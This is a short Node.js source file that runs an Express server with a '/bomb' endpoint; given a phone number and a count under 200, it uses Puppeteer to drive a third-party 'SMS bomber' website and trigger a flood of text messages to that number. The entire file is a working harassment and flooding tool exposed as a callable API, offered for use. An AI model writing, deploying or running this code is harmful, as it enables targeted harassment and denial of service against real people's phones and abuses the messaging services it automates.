const express = require('express')
const app=express()
const url = 'https://mytoolstown.com/smsbomber/#bestsmsbomber';
const puppeteer = require('puppeteer');
var port=process.env.PORT || 8080

app.get('/bomb',(req,res)=>{
    var mobile=req.query.mobile
    var n=req.query.n
    if(mobile==null || n==null || mobile=='' || n=='') res.json({status:'Please send mobile and n query...'})
    else if(n>=200) res.json({status:"n should less than 200"})
    else getRandomBins(mobile,n,res)
})
app.listen(port,()=>{
    console.log("Server running on port "+port)
})

async function getRandomBins(mobile,n,res) {
    const browser = await puppeteer.launch({ 
        headless: true, 
        defaultViewport: null,
    });
    const page = await browser.newPage();
    await page.goto(url, { waitUntil: 'networkidle2' });
    await page.type('#mobno', mobile, {delay: 20})
    await page.type('#count', n, {delay: 20})
    await (await page.$("#customRadio3")).click()
    await (await page.$("#startsms")).click()
    res.json({status:'success',msg:"Sent request successfully to server..."})
}